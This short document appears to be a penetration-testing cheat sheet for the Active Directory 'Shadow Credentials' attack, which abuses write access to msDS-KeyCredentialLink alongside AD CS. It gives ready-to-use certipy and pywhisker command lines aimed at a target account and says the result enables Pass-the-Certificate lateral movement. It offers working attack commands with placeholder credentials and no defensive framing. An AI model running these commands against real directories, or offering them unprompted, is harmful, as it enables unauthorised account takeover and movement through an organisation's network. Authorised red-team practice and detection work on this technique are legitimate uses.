# can change msDS-KeyCredentialLink (GenericWrite) + ADCS 

## AKA Shadow Credentials

## Tools: Whisker.exe , pywhisker.py , certipy

#### 1) certipy

 - certipy shadow auto -u 'USER@DOMAIN' -p PASSWORD -account 'TARGET_ACCOUNT'

#### 2) pywhisker.py

 - pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p"CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"

### With this attack, we can perform Pass-the-Certificate for Lateral Movement
